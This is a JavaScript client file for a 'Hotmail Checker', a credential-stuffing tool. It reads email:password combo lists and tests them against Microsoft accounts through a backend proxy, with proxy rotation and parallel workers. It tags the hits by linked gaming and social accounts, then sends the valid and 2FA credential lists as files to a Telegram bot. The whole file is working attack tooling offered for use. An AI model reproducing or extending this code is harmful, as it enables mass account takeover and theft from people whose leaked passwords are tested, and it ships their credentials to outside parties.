/* ══════════════════════════════════════════════════════════════════════════════
   HOTMAIL CHECKER v2.0 — PHP Proxy Edition (Fixed)
   ✔ Telegram now sends actual .txt files (sendDocument)
   ✔ Ping action fixed
   ✔ Download combo button after scan completes
   ══════════════════════════════════════════════════════════════════════════════ */

'use strict';

// ───────────────────────────────────────────────────────────────────────────
// CONFIG
// ───────────────────────────────────────────────────────────────────────────
const PROXY_URL = '/api/checker';

// ───────────────────────────────────────────────────────────────────────────
// STATE
// ───────────────────────────────────────────────────────────────────────────
const State = {
  sessionId: null,
  checkMode: 'all',
  comboLines: 0,
  running: false,
  cancelled: false,
  selectedFile: null,
  proxyFile: null,
  proxyLines: 0,
  useProxies: false,
  proxies: [],
  proxyIndex: 0,
  stats: {
    total: 0, checked: 0, hits: 0, twoFA: 0, bads: 0,
    msPremium: 0, msFree: 0,
    psnHits: 0, steamHits: 0, supercellHits: 0, tiktokHits: 0, minecraftHits: 0,
    cpm: 0, startTime: 0, currentEmail: ''
  }
};

// ───────────────────────────────────────────────────────────────────────────
// DOM REFS
// ───────────────────────────────────────────────────────────────────────────
const $ = id => document.getElementById(id);
const el = {
  setupPanel:        $('setupPanel'),
  dashboardPanel:    $('dashboardPanel'),
  finalReport:       $('finalReport'),
  comboFile:         $('comboFile'),
  fileDrop:          $('fileDrop'),
  fileDropInner:     $('fileDropInner'),
  fileSelected:      $('fileSelected'),
  fileName:          $('fileName'),
  fileLines:         $('fileLines'),
  fileClear:         $('fileClear'),
  useProxies:        $('useProxies'),
  proxyDrop:         $('proxyDrop'),
  proxyFile:         $('proxyFile'),
  proxyDropInner:    $('proxyDropInner'),
  proxySelected:     $('proxySelected'),
  proxyFileName:     $('proxyFileName'),
  proxyFileLines:    $('proxyFileLines'),
  proxyClear:        $('proxyClear'),
  proxyFormats:      $('proxyFormats'),
  telegramToken:     $('telegramToken'),
  telegramChatId:    $('telegramChatId'),
  modeGrid:          $('modeGrid'),
  threads:           $('threads'),
  threadValue:       $('threadValue'),
  autoDelete:        $('autoDelete'),
  startBtn:          $('startBtn'),
  progressFill:      $('progressFill'),
  progressPct:       $('progressPct'),
  progressCount:     $('progressCount'),
  cpmBadge:          $('cpmBadge'),
  currentEmail:      $('currentEmail'),
  statHits:          $('statHits'),
  stat2FA:           $('stat2FA'),
  statBads:          $('statBads'),
  barHits:           $('barHits'),
  bar2FA:            $('bar2FA'),
  barBads:           $('barBads'),
  svcMsPremium:      $('svcMsPremium'),
  svcMsFree:         $('svcMsFree'),
  svcPsn:            $('svcPsn'),
  svcSteamCount:     $('svcSteamCount'),
  svcSupercellCount: $('svcSupercellCount'),
  svcTiktokCount:    $('svcTiktokCount'),
  svcMinecraftCount: $('svcMinecraftCount'),
  feedLog:           $('feedLog'),
  feedClear:         $('feedClear'),
  telegramStatus:    $('telegramStatus'),
  telegramMsg:       $('telegramMsg'),
  stopBtn:           $('stopBtn'),
  resetBtn:          $('resetBtn'),
  wsStatus:          $('wsStatus'),
  reportTime:        $('reportTime'),
  reportGrid:        $('reportGrid'),
  downloadBtn:       $('downloadBtn'),
};

// ───────────────────────────────────────────────────────────────────────────
// UTILITIES
// ───────────────────────────────────────────────────────────────────────────
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function generateUUID() {
  if (crypto && crypto.randomUUID) return crypto.randomUUID();
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

function setStatus(text, cls) {
  el.wsStatus.innerHTML = `<span class="dot ${cls}"></span><span>${text}</span>`;
}

function showToast(message, type = 'info') {
  let container = document.querySelector('.toast-container');
  if (!container) {
    container = document.createElement('div');
    container.className = 'toast-container';
    document.body.appendChild(container);
  }
  const icons = { success: '✅', error: '❌', info: '💡' };
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `<span>${icons[type] || 'ℹ️'}</span><span>${message}</span>`;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 4200);
}

// ───────────────────────────────────────────────────────────────────────────
// PARTICLES
// ───────────────────────────────────────────────────────────────────────────
function initParticles() {
  const container = document.getElementById('particles');
  for (let i = 0; i < 30; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    const size = Math.random() * 4 + 1;
    p.style.cssText = `
      left: ${Math.random() * 100}%;
      width: ${size}px;
      height: ${size}px;
      animation-duration: ${Math.random() * 20 + 15}s;
      animation-delay: ${Math.random() * 20}s;
      opacity: ${Math.random() * 0.3};
    `;
    const colors = ['#6366f1','#8b5cf6','#06b6d4','#ec4899','#22c55e'];
    p.style.background = colors[Math.floor(Math.random() * colors.length)];
    container.appendChild(p);
  }
}

// ───────────────────────────────────────────────────────────────────────────
// FILE UPLOAD
// ───────────────────────────────────────────────────────────────────────────
function initFileUpload() {
  const drop = el.fileDrop;
  drop.addEventListener('click', (e) => {
    if (e.target === el.fileClear) return;
    el.comboFile.click();
  });
  el.comboFile.addEventListener('change', (e) => {
    if (e.target.files[0]) handleFileSelect(e.target.files[0]);
  });
  drop.addEventListener('dragover', (e) => { e.preventDefault(); drop.classList.add('dragging'); });
  drop.addEventListener('dragleave', () => drop.classList.remove('dragging'));
  drop.addEventListener('drop', (e) => {
    e.preventDefault();
    drop.classList.remove('dragging');
    if (e.dataTransfer.files[0]) handleFileSelect(e.dataTransfer.files[0]);
  });
  el.fileClear.addEventListener('click', (e) => { e.stopPropagation(); clearFile(); });
}

function handleFileSelect(file) {
  if (!file.name.endsWith('.txt')) { showToast('Please select a .txt file', 'error'); return; }
  State.selectedFile = file;
  const reader = new FileReader();
  reader.onload = (e) => {
    const lines = e.target.result.split('\n').filter(l => l.trim() && l.includes(':'));
    State.comboLines = lines.length;
    el.fileName.textContent = file.name;
    el.fileLines.textContent = `${lines.length.toLocaleString()} valid combos`;
    el.fileDropInner.classList.add('hidden');
    el.fileSelected.classList.remove('hidden');
    showToast(`Loaded ${lines.length.toLocaleString()} combos`, 'success');
  };
  reader.readAsText(file);
}

function clearFile() {
  State.selectedFile = null; State.comboLines = 0;
  el.comboFile.value = '';
  el.fileDropInner.classList.remove('hidden');
  el.fileSelected.classList.add('hidden');
}

// ───────────────────────────────────────────────────────────────────────────
// PROXY FILE UPLOAD
// ───────────────────────────────────────────────────────────────────────────
function initProxyUpload() {
  el.useProxies.addEventListener('change', () => {
    State.useProxies = el.useProxies.checked;
    el.proxyDrop.classList.toggle('hidden', !State.useProxies);
    el.proxyFormats.classList.toggle('hidden', !State.useProxies);
    if (!State.useProxies) clearProxyFile();
  });
  el.proxyDrop.addEventListener('click', (e) => {
    if (e.target === el.proxyClear) return;
    el.proxyFile.click();
  });
  el.proxyFile.addEventListener('change', (e) => {
    if (e.target.files[0]) handleProxyFileSelect(e.target.files[0]);
  });
  el.proxyDrop.addEventListener('dragover', (e) => { e.preventDefault(); el.proxyDrop.classList.add('dragging'); });
  el.proxyDrop.addEventListener('dragleave', () => el.proxyDrop.classList.remove('dragging'));
  el.proxyDrop.addEventListener('drop', (e) => {
    e.preventDefault(); el.proxyDrop.classList.remove('dragging');
    if (e.dataTransfer.files[0]) handleProxyFileSelect(e.dataTransfer.files[0]);
  });
  el.proxyClear.addEventListener('click', (e) => { e.stopPropagation(); clearProxyFile(); });
}

function handleProxyFileSelect(file) {
  if (!file.name.endsWith('.txt')) { showToast('Please select a .txt file for proxies', 'error'); return; }
  State.proxyFile = file;
  const reader = new FileReader();
  reader.onload = (e) => {
    const lines = e.target.result.split('\n').filter(l => l.trim());
    State.proxies = lines;
    State.proxyLines = lines.length;
    el.proxyFileName.textContent = file.name;
    el.proxyFileLines.textContent = `${lines.length.toLocaleString()} proxies loaded`;
    el.proxyDropInner.classList.add('hidden');
    el.proxySelected.classList.remove('hidden');
    showToast(`Loaded ${lines.length.toLocaleString()} proxies`, 'success');
  };
  reader.readAsText(file);
}

function clearProxyFile() {
  State.proxyFile = null; State.proxies = []; State.proxyLines = 0;
  el.proxyFile.value = '';
  el.proxyDropInner.classList.remove('hidden');
  el.proxySelected.classList.add('hidden');
}

function getNextProxy() {
  if (!State.useProxies || State.proxies.length === 0) return null;
  const proxy = State.proxies[State.proxyIndex % State.proxies.length];
  State.proxyIndex++;
  return proxy;
}

// ───────────────────────────────────────────────────────────────────────────
// MODE SELECTION & SLIDER
// ───────────────────────────────────────────────────────────────────────────
function initModeSelection() {
  el.modeGrid.querySelectorAll('.mode-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      el.modeGrid.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      State.checkMode = btn.dataset.mode;
    });
  });
}

function initSlider() {
  el.threads.addEventListener('input', () => {
    el.threadValue.textContent = el.threads.value;
    const val = (el.threads.value - 1) / 29 * 100;
    el.threads.style.background = `linear-gradient(to right, #6366f1 ${val}%, #1c1e2e ${val}%)`;
  });
  el.threads.style.background = `linear-gradient(to right, #6366f1 13.8%, #1c1e2e 13.8%)`;
}

// ───────────────────────────────────────────────────────────────────────────
// PHP PROXY CALL
// ───────────────────────────────────────────────────────────────────────────
async function callProxy(payload) {
  try {
    const res = await fetch(PROXY_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) return { error: `HTTP ${res.status}` };
    const text = await res.text();
    const trimmed = (text || '').trim();
    // Strip any PHP warnings/notices before JSON
    const jsonStart = trimmed.indexOf('{');
    const jsonStr = jsonStart > 0 ? trimmed.slice(jsonStart) : trimmed;
    if (!jsonStr.startsWith('{') && !jsonStr.startsWith('[')) {
      console.warn('PHP proxy returned non-JSON:', trimmed.slice(0, 300));
      return { error: 'proxy_non_json', raw: trimmed.slice(0, 300) };
    }
    return JSON.parse(jsonStr);
  } catch (e) {
    return { error: e.message };
  }
}

// ───────────────────────────────────────────────────────────────────────────
// CHECK ACCOUNT
// ───────────────────────────────────────────────────────────────────────────
async function checkAccount(email, password, checkMode) {
  const proxy = getNextProxy();
  const result = await callProxy({
    action:    'check',
    email,
    password,
    checkMode,
    proxy
  });

  if (!result || result.error) {
    return { status: 'ERROR', reason: result ? result.error : 'No response' };
  }

  if (result.status === 'HIT') {
    if (result.msStatus === 'PREMIUM') State.stats.msPremium++;
    else if (result.msStatus === 'FREE') State.stats.msFree++;
    if ((result.psnOrders  || 0) > 0) State.stats.psnHits++;
    if ((result.steamCount || 0) > 0) State.stats.steamHits++;
    if (result.supercellGames && result.supercellGames.length > 0) State.stats.supercellHits++;
    if (result.tiktokUsername) State.stats.tiktokHits++;
    if (result.minecraftUsername) State.stats.minecraftHits++;
  }

  return result;
}

// ───────────────────────────────────────────────────────────────────────────
// TELEGRAM — send via PHP proxy as actual document files (FIXED)
// ───────────────────────────────────────────────────────────────────────────
async function telegramSendMessage(token, chatId, text) {
  const res = await callProxy({ action: 'telegram_message', token, chatId, text });
  return res && res.ok;
}

/**
 * FIXED: now sends as actual Telegram document (.txt file) not just a text message
 */
async function telegramSendDocument(token, chatId, filename, content, caption) {
  const res = await callProxy({
    action: 'telegram_document',
    token,
    chatId,
    filename,
    content,
    caption: caption || ''
  });
  return res && res.ok;
}

// Fallback: send as text message chunks if document fails
async function telegramSendText(token, chatId, filename, content) {
  const res = await callProxy({ action: 'telegram_text', token, chatId, filename, content });
  return res && res.ok;
}

// ───────────────────────────────────────────────────────────────────────────
// SCAN ENGINE
// ───────────────────────────────────────────────────────────────────────────
let allResults = {};

async function startScan() {
  if (!State.selectedFile) { showToast('Please select a combo file first', 'error'); return; }
  const token  = el.telegramToken.value.trim();
  const chatId = el.telegramChatId.value.trim();
  if (!token || !chatId) { showToast('Please enter Telegram Bot Token and Chat ID', 'error'); return; }

  el.startBtn.disabled = true;
  el.startBtn.querySelector('.btn-text').textContent = 'Starting...';

  const fileText = await new Promise(resolve => {
    const reader = new FileReader();
    reader.onload = e => resolve(e.target.result);
    reader.readAsText(State.selectedFile);
  });

  const lines = fileText.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));

  if (lines.length === 0) {
    showToast('No valid combo lines found', 'error');
    el.startBtn.disabled = false;
    el.startBtn.querySelector('.btn-text').textContent = 'Start Scan';
    return;
  }

  // Reset results
  allResults = {
    allHits: [], microsoft: [], psn: [], steam: [],
    supercell: [], tiktok: [], minecraft: [], twoFA: []
  };

  State.sessionId  = generateUUID();
  State.running    = true;
  State.cancelled  = false;
  State.proxyIndex = 0;
  State.stats = {
    total: lines.length, checked: 0, hits: 0, twoFA: 0, bads: 0,
    msPremium: 0, msFree: 0,
    psnHits: 0, steamHits: 0, supercellHits: 0, tiktokHits: 0, minecraftHits: 0,
    cpm: 0, startTime: Date.now(), currentEmail: ''
  };

  el.setupPanel.classList.add('hidden');
  el.dashboardPanel.classList.remove('hidden');
  el.finalReport.classList.add('hidden');
  resetDashboard(lines.length);
  setStatus('Running', 'connected');
  addFeedEntry('info', 'START', `Session <span class="fe-em">${State.sessionId.slice(0,8)}…</span> launched with ${lines.length.toLocaleString()} combos`);
  showToast('Scan started!', 'success');

  // Check PHP proxy is reachable
  const pingResult = await callProxy({ action: 'ping' });
  if (!pingResult || pingResult.error) {
    showToast('⚠️ API not found! Check your Vercel deployment.', 'error');
    addFeedEntry('bad', 'ERROR', 'API not reachable — make sure Vercel deployment is active.');
    el.startBtn.disabled = false;
    el.startBtn.querySelector('.btn-text').textContent = 'Start Scan';
    el.setupPanel.classList.remove('hidden');
    el.dashboardPanel.classList.add('hidden');
    return;
  }

  addFeedEntry('info', 'PING', 'API ✅ reachable — starting scan...');

  const threadCount = Math.min(Math.max(parseInt(el.threads.value) || 5, 1), 30);
  let index = 0;

  async function worker() {
    while (index < lines.length && !State.cancelled) {
      const line = lines[index++];
      await processLine(line);
    }
  }

  const workers = [];
  for (let i = 0; i < threadCount; i++) workers.push(worker());
  await Promise.all(workers);

  // Finalize
  State.running = false;
  State.stats.currentEmail = '';
  el.currentEmail.textContent = '—';
  el.progressFill.style.width = '100%';
  el.progressPct.textContent  = '100%';
  el.stopBtn.classList.add('hidden');
  el.resetBtn.classList.remove('hidden');
  setStatus('Completed', 'connected');

  const elapsed = (Date.now() - State.stats.startTime) / 1000;
  const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);

  addFeedEntry('info', 'DONE', `Scan complete in <span class="fe-em">${timeStr}</span>`);
  showToast('Scan completed!', 'success');

  // Send to Telegram
  if (token && chatId && (State.stats.hits > 0 || State.stats.twoFA > 0)) {
    el.telegramStatus.classList.remove('hidden');
    el.telegramMsg.textContent = 'Sending summary to Telegram...';
    addFeedEntry('tg', 'TGRAM', 'Sending results to Telegram...');

    const summary =
      `<b>✅ Scan Completed</b>\n\n` +
      `<b>📊 Results:</b>\n` +
      `• Hits: <b>${State.stats.hits}</b>\n` +
      `• 2FA: <b>${State.stats.twoFA}</b>\n` +
      `• Bad: <b>${State.stats.bads}</b>\n` +
      `• Total Checked: <b>${State.stats.checked}</b>\n\n` +
      `<b>🎮 Gaming:</b>\n` +
      `• Xbox Premium: <b>${State.stats.msPremium}</b>\n` +
      `• PSN Hits: <b>${State.stats.psnHits}</b>\n` +
      `• Steam Hits: <b>${State.stats.steamHits}</b>\n` +
      `• Supercell: <b>${State.stats.supercellHits}</b>\n` +
      `• Minecraft: <b>${State.stats.minecraftHits}</b>\n` +
      `• TikTok: <b>${State.stats.tiktokHits}</b>\n\n` +
      `<b>⏱ Stats:</b>\n` +
      `• Time: ${timeStr}\n` +
      `• Speed: ${State.stats.cpm} CPM\n\n` +
      `<b>💎 Created by @Yukiii_ii</b>\n` +
      `<b>🔗 Channel: https://t.me/Yuki_channelll</b>`;

    await telegramSendMessage(token, chatId, summary);

    const caption = '💎 Created by @Yukiii_ii | https://t.me/Yuki_channelll';

    // FIXED: Send actual .txt files as Telegram documents
    const filesToSend = [
      { name: 'All_Hits.txt',       data: allResults.allHits    },
      { name: '2FA.txt',            data: allResults.twoFA      },
      { name: 'Hits_Microsoft.txt', data: allResults.microsoft  },
      { name: 'Hits_PSN.txt',       data: allResults.psn        },
      { name: 'Hits_Steam.txt',     data: allResults.steam      },
      { name: 'Hits_Supercell.txt', data: allResults.supercell  },
      { name: 'Hits_TikTok.txt',    data: allResults.tiktok     },
      { name: 'Hits_Minecraft.txt', data: allResults.minecraft  },
    ];

    for (const f of filesToSend) {
      if (f.data && f.data.length > 0) {
        el.telegramMsg.textContent = `Sending ${f.name}...`;
        addFeedEntry('tg', 'TGRAM', `Sending ${f.name} (${f.data.length} lines)...`);
        const content = '# Created by @Yukiii_ii https://t.me/Yuki_channelll\n\n' + f.data.join('\n');
        // Try sending as document first
        const sent = await telegramSendDocument(token, chatId, f.name, content, caption);
        if (!sent) {
          // Fallback to text message chunks
          await telegramSendText(token, chatId, f.name, content);
        }
        await sleep(1200);
      }
    }

    el.telegramMsg.textContent = '✅ All results sent to Telegram!';
    addFeedEntry('tg', 'TGRAM', '✅ All results sent to Telegram!');
  }

  showFinalReport(State.stats, timeStr);
}

async function processLine(line) {
  const colonIdx = line.indexOf(':');
  if (colonIdx === -1) { updateStats('BAD', null); return; }
  const email    = line.substring(0, colonIdx).trim();
  const password = line.substring(colonIdx + 1).trim();

  State.stats.currentEmail = email;
  el.currentEmail.textContent = email;
  updateUI();

  try {
    const result = await checkAccount(email, password, State.checkMode);

    if (result.status === 'HIT') {
      updateStats('HIT', result);
      allResults.allHits.push(`${email}:${password}`);

      if (result.subscriptions && result.subscriptions.length > 0) {
        const subs = result.subscriptions.slice(0, 3).map(s => s.name).join(' | ');
        allResults.microsoft.push(`${email}:${password} | ${subs}`);
      }
      if ((result.psnOrders  || 0) > 0) allResults.psn.push(`${email}:${password} | Orders: ${result.psnOrders}`);
      if ((result.steamCount || 0) > 0) allResults.steam.push(`${email}:${password} | Games: ${result.steamCount}`);
      if (result.supercellGames && result.supercellGames.length > 0)
        allResults.supercell.push(`${email}:${password} | ${result.supercellGames.join(', ')}`);
      if (result.tiktokUsername)    allResults.tiktok.push(`${email}:${password} | @${result.tiktokUsername}`);
      if (result.minecraftUsername) allResults.minecraft.push(`${email}:${password} | ${result.minecraftUsername}`);

      addHitFeedEntry({ email, password, result });
      showToast(`✅ HIT: ${email}`, 'success');

    } else if (result.status === '2FA') {
      updateStats('2FA', null);
      allResults.twoFA.push(`${email}:${password}`);
      addFeedEntry('2fa', '2FA', `<span class="fe-em">${email}</span>`);

    } else {
      updateStats('BAD', null);
    }
  } catch (e) {
    updateStats('BAD', null);
  }

  await sleep(100);
}

// ───────────────────────────────────────────────────────────────────────────
// STATS & UI
// ───────────────────────────────────────────────────────────────────────────
function updateStats(status, data) {
  State.stats.checked++;
  const elapsed = (Date.now() - State.stats.startTime) / 1000;
  State.stats.cpm = elapsed > 0 ? Math.floor(State.stats.checked / elapsed * 60) : 0;
  if (status === 'HIT')      State.stats.hits++;
  else if (status === '2FA') State.stats.twoFA++;
  else                       State.stats.bads++;
  updateUI();
}

function updateUI() {
  const stats   = State.stats;
  const total   = stats.total || 1;
  const checked = stats.checked || 0;
  const pct     = Math.min(Math.round(checked / total * 100), 100);

  el.progressFill.style.width  = `${pct}%`;
  el.progressPct.textContent   = `${pct}%`;
  el.progressCount.textContent = `${checked.toLocaleString()} / ${total.toLocaleString()}`;
  el.cpmBadge.textContent      = `${stats.cpm || 0} CPM`;
  if (stats.currentEmail) el.currentEmail.textContent = stats.currentEmail;

  animateNumber(el.statHits, stats.hits  || 0);
  animateNumber(el.stat2FA,  stats.twoFA || 0);
  animateNumber(el.statBads, stats.bads  || 0);

  const hPct = checked ? Math.min((stats.hits  / checked) * 100, 100) : 0;
  const tPct = checked ? Math.min((stats.twoFA / checked) * 100, 100) : 0;
  const bPct = checked ? Math.min((stats.bads  / checked) * 100, 100) : 0;
  el.barHits.style.width  = `${hPct}%`;
  el.bar2FA.style.width   = `${tPct}%`;
  el.barBads.style.width  = `${bPct}%`;

  el.svcMsPremium.textContent       = stats.msPremium     || 0;
  el.svcMsFree.textContent          = stats.msFree        || 0;
  el.svcPsn.textContent             = stats.psnHits       || 0;
  el.svcSteamCount.textContent      = stats.steamHits     || 0;
  el.svcSupercellCount.textContent  = stats.supercellHits || 0;
  el.svcTiktokCount.textContent     = stats.tiktokHits    || 0;
  el.svcMinecraftCount.textContent  = stats.minecraftHits || 0;
}

function animateNumber(elem, target) {
  const current = parseInt(elem.textContent) || 0;
  if (current === target) return;
  elem.textContent = target;
  elem.style.transform = 'scale(1.15)';
  elem.style.transition = 'transform .2s';
  setTimeout(() => { elem.style.transform = 'scale(1)'; }, 200);
}

// ───────────────────────────────────────────────────────────────────────────
// DASHBOARD
// ───────────────────────────────────────────────────────────────────────────
function resetDashboard(total) {
  el.progressFill.style.width = '0%';
  el.progressPct.textContent  = '0%';
  el.progressCount.textContent = `0 / ${total.toLocaleString()}`;
  el.cpmBadge.textContent = '0 CPM';
  el.currentEmail.textContent = '—';
  el.statHits.textContent = '0'; el.stat2FA.textContent = '0'; el.statBads.textContent = '0';
  el.barHits.style.width = '0%'; el.bar2FA.style.width = '0%'; el.barBads.style.width = '0%';
  el.svcMsPremium.textContent = '0'; el.svcMsFree.textContent = '0';
  el.svcPsn.textContent = '0'; el.svcSteamCount.textContent = '0';
  el.svcSupercellCount.textContent = '0'; el.svcTiktokCount.textContent = '0';
  el.svcMinecraftCount.textContent = '0';
  el.feedLog.innerHTML = '';
  el.telegramStatus.classList.add('hidden');
  el.stopBtn.classList.remove('hidden');
  el.resetBtn.classList.add('hidden');
}

// ───────────────────────────────────────────────────────────────────────────
// FEED LOG
// ───────────────────────────────────────────────────────────────────────────
function addFeedEntry(type, badgeText, text) {
  const now = new Date().toTimeString().slice(0,8);
  const div = document.createElement('div');
  div.className = 'feed-entry';
  const badgeClass = { hit: 'fe-hit', '2fa': 'fe-2fa', bad: 'fe-bad', tg: 'fe-tg', info: 'fe-info' }[type] || 'fe-info';
  div.innerHTML = `
    <span class="fe-time">${now}</span>
    <span class="fe-badge ${badgeClass}">${badgeText}</span>
    <span class="fe-text">${text}</span>
  `;
  el.feedLog.appendChild(div);
  while (el.feedLog.children.length > 200) el.feedLog.removeChild(el.feedLog.firstChild);
  el.feedLog.scrollTop = el.feedLog.scrollHeight;
}

function addHitFeedEntry(msg) {
  const result = msg.result || {};
  const parts = [];
  if (result.subscriptions && result.subscriptions.length)
    parts.push(`<span class="fe-em">Xbox:${result.subscriptions.map(s=>s.name).join(',')}</span>`);
  if ((result.psnOrders  || 0) > 0) parts.push(`<span class="fe-em">PSN:${result.psnOrders}</span>`);
  if ((result.steamCount || 0) > 0) parts.push(`<span class="fe-em">Steam:${result.steamCount}</span>`);
  if (result.supercellGames && result.supercellGames.length)
    parts.push(`<span class="fe-em">SC:${result.supercellGames.join(',')}</span>`);
  if (result.tiktokUsername)    parts.push(`<span class="fe-em">TT:@${result.tiktokUsername}</span>`);
  if (result.minecraftUsername) parts.push(`<span class="fe-em">MC:${result.minecraftUsername}</span>`);
  const detail = parts.length ? ` <span class="fe-detail">| ${parts.join(' | ')}</span>` : '';
  addFeedEntry('hit', 'HIT', `<span class="fe-em">${msg.email}</span>${detail}`);
}

// ───────────────────────────────────────────────────────────────────────────
// FINAL REPORT + DOWNLOAD COMBO BUTTON
// ───────────────────────────────────────────────────────────────────────────
function showFinalReport(stats, timeStr) {
  el.finalReport.classList.remove('hidden');
  el.reportTime.textContent = `Completed in ${timeStr} • ${stats.cpm || 0} CPM`;

  const items = [
    { label: 'Total Hits',    value: stats.hits          || 0, cls: 'green'  },
    { label: '2FA Accounts',  value: stats.twoFA         || 0, cls: 'yellow' },
    { label: 'Bad / Failed',  value: stats.bads          || 0, cls: 'red'    },
    { label: 'MS Premium',    value: stats.msPremium     || 0, cls: 'purple' },
    { label: 'PSN Orders',    value: stats.psnHits       || 0, cls: 'cyan'   },
    { label: 'Steam Hits',    value: stats.steamHits     || 0, cls: 'cyan'   },
    { label: 'Supercell',     value: stats.supercellHits || 0, cls: 'pink'   },
    { label: 'TikTok',        value: stats.tiktokHits    || 0, cls: 'pink'   },
    { label: 'Minecraft',     value: stats.minecraftHits || 0, cls: 'green'  },
    { label: 'Total Checked', value: stats.checked       || 0, cls: ''       },
  ];

  el.reportGrid.innerHTML = items.map(item => `
    <div class="report-item ${item.cls}">
      <div class="ri-label">${item.label}</div>
      <div class="ri-value">${item.value.toLocaleString()}</div>
    </div>
  `).join('');

  // Show download button
  if (el.downloadBtn) {
    el.downloadBtn.classList.remove('hidden');
  }

  setTimeout(() => el.finalReport.scrollIntoView({ behavior: 'smooth', block: 'start' }), 400);
}

/**
 * Build a ZIP-like bundle of all result files and download it
 * Since we can't create real zips in pure JS without a library,
 * we bundle all results into one .txt file with clear section headers
 */
function downloadResults() {
  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  let content = `# HOTMAIL Checker v2.0 - Results\n`;
  content += `# Created by @Yukiii_ii | https://t.me/Yuki_channelll\n`;
  content += `# Date: ${new Date().toLocaleString()}\n`;
  content += `# Total Hits: ${allResults.allHits.length} | 2FA: ${allResults.twoFA.length}\n`;
  content += `${'='.repeat(60)}\n\n`;

  const sections = [
    { title: 'ALL HITS',        data: allResults.allHits   },
    { title: '2FA ACCOUNTS',    data: allResults.twoFA     },
    { title: 'MICROSOFT / XBOX',data: allResults.microsoft },
    { title: 'PLAYSTATION (PSN)',data: allResults.psn      },
    { title: 'STEAM',           data: allResults.steam     },
    { title: 'SUPERCELL GAMES', data: allResults.supercell },
    { title: 'TIKTOK',          data: allResults.tiktok    },
    { title: 'MINECRAFT',       data: allResults.minecraft },
  ];

  for (const sec of sections) {
    if (sec.data && sec.data.length > 0) {
      content += `[${'─'.repeat(20)} ${sec.title} ${'─'.repeat(20)}]\n`;
      content += sec.data.join('\n') + '\n\n';
    }
  }

  const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = `HOTMAIL_Results_${ts}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  showToast('📥 Results downloaded!', 'success');
}

// ───────────────────────────────────────────────────────────────────────────
// STOP / RESET / CONTROLS
// ───────────────────────────────────────────────────────────────────────────
function initControls() {
  el.stopBtn.addEventListener('click', () => {
    State.cancelled = true; State.running = false;
    addFeedEntry('info', 'STOP', 'Scan stop requested...');
    showToast('Stopping scan...', 'info');
    setStatus('Stopped', 'disconnected');
  });

  el.resetBtn.addEventListener('click', () => {
    State.sessionId = null; State.running = false; State.cancelled = false;
    el.dashboardPanel.classList.add('hidden');
    el.finalReport.classList.add('hidden');
    el.setupPanel.classList.remove('hidden');
    el.startBtn.disabled = false;
    el.startBtn.querySelector('.btn-text').textContent = 'Start Scan';
    if (el.downloadBtn) el.downloadBtn.classList.add('hidden');
    clearFile();
    setStatus('Ready', 'connected');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });

  el.feedClear.addEventListener('click', () => { el.feedLog.innerHTML = ''; });

  // Download button
  if (el.downloadBtn) {
    el.downloadBtn.addEventListener('click', downloadResults);
  }
}

// ───────────────────────────────────────────────────────────────────────────
// LOCAL STORAGE CONFIG
// ───────────────────────────────────────────────────────────────────────────
function loadSavedConfig() {
  try {
    const saved = JSON.parse(localStorage.getItem('hmc_config') || '{}');
    if (!saved) return;
    if (saved.telegramToken)  el.telegramToken.value  = saved.telegramToken;
    if (saved.telegramChatId) el.telegramChatId.value = saved.telegramChatId;
    if (saved.checkMode) {
      State.checkMode = saved.checkMode;
      el.modeGrid.querySelectorAll('.mode-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.mode === saved.checkMode);
      });
    }
    if (saved.threads) {
      el.threads.value = saved.threads;
      el.threadValue.textContent = saved.threads;
    }
  } catch {}
}

function saveConfig() {
  try {
    localStorage.setItem('hmc_config', JSON.stringify({
      telegramToken:  el.telegramToken.value.trim(),
      telegramChatId: el.telegramChatId.value.trim(),
      checkMode:      State.checkMode,
      threads:        el.threads.value
    }));
  } catch {}
}

function initAutoSave() {
  [el.telegramToken, el.telegramChatId].forEach(inp => inp.addEventListener('input', saveConfig));
  el.threads.addEventListener('change', saveConfig);
}

// ───────────────────────────────────────────────────────────────────────────
// INIT
// ───────────────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initParticles();
  setStatus('Ready', 'connected');
  initFileUpload();
  initProxyUpload();
  initModeSelection();
  initSlider();
  el.startBtn.addEventListener('click', startScan);
  initControls();
  loadSavedConfig();
  initAutoSave();
});